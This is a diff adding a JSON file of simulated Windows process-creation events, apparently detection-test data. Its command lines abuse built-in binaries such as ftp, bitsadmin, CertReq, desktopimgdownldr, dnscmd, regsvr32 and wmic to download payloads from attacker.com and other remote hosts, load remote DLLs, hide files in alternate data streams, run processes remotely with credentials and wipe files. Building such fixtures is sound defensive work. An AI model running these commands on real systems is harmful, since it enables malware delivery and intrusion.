@@ -1,0 +1,152 @@
+[
+ {
+  "FileName": "SharpHound.ps1",
+  "ExecutablePath": "C:\\Windows\\SysWOW64\\SharpHound.ps1",
+  "CommandLine": "powershell SharpHound.ps1",
+  "ParentCommandLine": "outlook.exe"
+ },
+ {
+  "FileName": "wscript.exe",
+  "ExecutablePath": "C:\\Windows\\SysWOW64\\wscript.exe",
+  "CommandLine": "wscript C:\\\\Users\\\\analyst01\\\\AppData\\\\Local\\\\Temp\\\\4caed3.tmp",
+  "ParentCommandLine": "C:\\Windows\\explorer.exe"
+ },
+ {
+  "FileName": "Ftp.exe",
+  "ExecutablePath": "C:\\Windows\\SysWOW64\\ftp.exe",
+  "CommandLine": "cmd.exe /c \"@echo open attacker.com 21>ftp.txt&@echo USER attacker>>ftp.txt&@echo PASS PaSsWoRd>>ftp.txt&@echo binary>>ftp.txt&@echo GET /payload.exe>>ftp.txt&@echo quit>>ftp.txt&@ftp -s:ftp.txt -v\"",
+  "ParentCommandLine": "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\\Users\\Public\\stage.ps1"
+ },
+ {
+  "FileName": "bitsadmin.exe",
+  "ExecutablePath": "C:\\Windows\\SysWOW64\\bitsadmin.exe",
+  "CommandLine": "bitsadmin /create 1 bitsadmin /addfile 1 https://cdn.contoso.lab/files/285a8dce.dat C:\\\\Users\\\\ajones\\\\AppData\\\\Local\\\\Temp\\\\99174c.tmp bitsadmin /RESUME 1 bitsadmin /complete 1",
+  "ParentCommandLine": "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\\Users\\Public\\stage.ps1"
+ },
+ {
+  "FileName": "notepad.exe",
+  "ExecutablePath": "C:\\Windows\\System32\\notepad.exe",
+  "CommandLine": "forfiles /p c:\\\\windows\\\\system32 /m notepad.exe /c \"c:\\\\folder\\\\normal.dll:update.exe\"",
+  "ParentCommandLine": "C:\\Windows\\explorer.exe"
+ },
+ {
+  "FileName": "AddinUtil.exe",
+  "ExecutablePath": "C:\\Windows\\Microsoft.NET\\Framework64\\v3.5\\AddInUtil.exe",
+  "CommandLine": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\AddinUtil.exe -AddinRoot:.",
+  "ParentCommandLine": "svchost.exe -k netsvcs -p"
+ },
+ {
+  "FileName": "CL_Invocation.ps1",
+  "ExecutablePath": "C:\\Windows\\diagnostics\\system\\WindowsUpdate\\CL_Invocation.ps1",
+  "CommandLine": ". C:\\Windows\\diagnostics\\system\\AERO\\CL_Invocation.ps1   \\nSyncInvoke C:\\Windows\\System32\\cmd.exe /c \"C:\\Windows\\System32\\whoami.exe\"",
+  "ParentCommandLine": "outlook.exe"
+ },
+ {
+  "FileName": "regasm.exe",
+  "ExecutablePath": "C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\regasm.exe",
+  "CommandLine": "regasm.exe AllTheThingsx64.dll",
+  "ParentCommandLine": "svchost.exe -k DcomLaunch -p"
+ },
+ {
+  "FileName": "desktopimgdownldr.exe",
+  "ExecutablePath": "c:\\windows\\system32\\desktopimgdownldr.exe",
+  "CommandLine": "desktopimgdownldr /lockscreenurl:http://203.0.113.145/cdn/8083ef9a/loader.bin /eventName:randomname",
+  "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k NetworkService"
+ },
+ {
+  "FileName": "Cmd.exe",
+  "ExecutablePath": "C:\\Windows\\System32\\cmd.exe",
+  "CommandLine": "type C:\\Users\\Public\\dfcacb\\update.exe > C:\\Users\\Public\\2811a3.dll",
+  "ParentCommandLine": "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\\Users\\Public\\stage.ps1"
+ },
+ {
+  "FileName": "Wfc.exe",
+  "ExecutablePath": "C:\\Program Files (x86)\\Microsoft SDKs\\Windows\\v10.0A\\bin\\NETFX 4.8 Tools\\wfc.exe",
+  "CommandLine": "wfc.exe C:\\ProgramData\\bda9d2\\cache.dll",
+  "ParentCommandLine": "wmiprvse.exe"
+ },
+ {
+  "FileName": "file.exe",
+  "ExecutablePath": "C:\\Windows\\System32\\file.exe",
+  "CommandLine": "makecab \\\\203.0.113.201.10\\\\webdav\\\\file.exe C:\\\\Folder\\\\file.cab",
+  "ParentCommandLine": "svchost.exe -k DcomLaunch -p"
+ },
+ {
+  "FileName": "AppVLP.exe",
+  "ExecutablePath": "C:\\Program Files\\Microsoft Office\\root\\client\\appvlp.exe",
+  "CommandLine": "AppVLP.exe \\\\webdav\\\\calc.bat",
+  "ParentCommandLine": "wmiprvse.exe"
+ },
+ {
+  "FileName": "update.exe",
+  "ExecutablePath": "C:\\Users\\<username>\\AppData\\Local\\Microsoft\\Teams\\update.exe",
+  "CommandLine": "cscript C:\\\\Users\\\\Public\\\\3e3a2e\\\\update.exe",
+  "ParentCommandLine": "excel.exe"
+ },
+ {
+  "FileName": "cmd.exe",
+  "ExecutablePath": "C:\\Windows\\System32\\cmd.exe",
+  "CommandLine": "cmd.exe /c echo regsvr32.exe ^/s ^/u ^/i:ms-appinstaller:?source=https://raw.githubusercontent.com/org-41f8/pkg/main/c87b3f58.appx ^scrobj.dll > fakefile.doc:payload.bat",
+  "ParentCommandLine": "winword.exe"
+ },
+ {
+  "FileName": "Msbuild.exe",
+  "ExecutablePath": "C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\Msbuild.exe",
+  "CommandLine": "wmic /node:192.0.2.55.10 /user:LAB\\Administrator /password:Password! process call create \"c:\\windows\\Microsoft.NET\\Framework\\v4.0.30319\\Msbuild.exe C:\\Windows\\Temp\\build.xml\"",
+  "ParentCommandLine": "winword.exe"
+ },
+ {
+  "FileName": "ATBroker.exe",
+  "ExecutablePath": "C:\\Windows\\SysWOW64\\Atbroker.exe",
+  "CommandLine": "ATBroker.exe /start da72d7.dll",
+  "ParentCommandLine": "C:\\Windows\\System32\\services.exe"
+ },
+ {
+  "FileName": "CertReq.exe",
+  "ExecutablePath": "C:\\Windows\\System32\\certreq.exe",
+  "CommandLine": "CertReq -Post -config https://raw.githubusercontent.com/user-64d6/payloads/main/c3790c2c.txt C:\\Windows\\System32\\spool\\drivers\\color\\c1cf2a.dll",
+  "ParentCommandLine": "svchost.exe -k netsvcs -p"
+ },
+ {
+  "FileName": "cd6b1e.dll",
+  "ExecutablePath": "C:\\Windows\\SysWOW64\\cd6b1e.dll",
+  "CommandLine": "makecab C:\\\\Users\\\\Public\\\\cd6b1e.dll C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\f8de25.dll",
+  "ParentCommandLine": "rundll32.exe"
+ },
+ {
+  "FileName": "calc.exe",
+  "ExecutablePath": "C:\\Windows\\SysWOW64\\calc.exe",
+  "CommandLine": "schtasks /create /tn ExampleTask /tr c:\\windows\\system32\\calc.exe /sc once /st 00:00 /S host.domain /RU System",
+  "ParentCommandLine": "wscript.exe"
+ },
+ {
+  "FileName": "Bitsadmin.exe",
+  "ExecutablePath": "C:\\Windows\\SysWOW64\\bitsadmin.exe",
+  "CommandLine": "bitsadmin /create 1 & bitsadmin /addfile 1 c:\\windows\\system32\\cmd.exe c:\\data\\playfolder\\cmd.exe & bitsadmin /RESUME 1 & bitsadmin /Complete 1 & bitsadmin /reset",
+  "ParentCommandLine": "\"C:\\Windows\\SysWOW64\\explorer.exe\""
+ },
+ {
+  "FileName": "OpenConsole.exe",
+  "ExecutablePath": "C:\\Program Files\\WindowsApps\\Microsoft.WindowsTerminal_1.18.10301.0_x64__8wekyb3d8bbwe\\OpenConsole.exe",
+  "CommandLine": "OpenConsole.exe C:\\Windows\\System32\\spool\\drivers\\color\\d39739.dll",
+  "ParentCommandLine": "C:\\Windows\\System32\\cmd.exe"
+ },
+ {
+  "FileName": "Cipher.exe",
+  "ExecutablePath": "c:\\windows\\syswow64\\cipher.exe",
+  "CommandLine": "cipher /w:C:\\Windows\\System32\\spool\\drivers\\color\\bceb85.dll",
+  "ParentCommandLine": "wscript.exe"
+ },
+ {
+  "FileName": "dnscmd.exe",
+  "ExecutablePath": "C:\\Windows\\System32\\Dnscmd.exe",
+  "CommandLine": "dnscmd.exe 198.51.100.88.10 /config /serverlevelplugindll \\\\193.168.0.149\\\\dll\\\\wtf.dll",
+  "ParentCommandLine": "C:\\Windows\\System32\\services.exe"
+ },
+ {
+  "FileName": "calc.exe",
+  "ExecutablePath": "C:\\Windows\\System32\\calc.exe",
+  "CommandLine": "echo !calc.exe > ftpcommands.txt && ftp -s:ftpcommands.txt",
+  "ParentCommandLine": "msiexec.exe"
+ }
+]
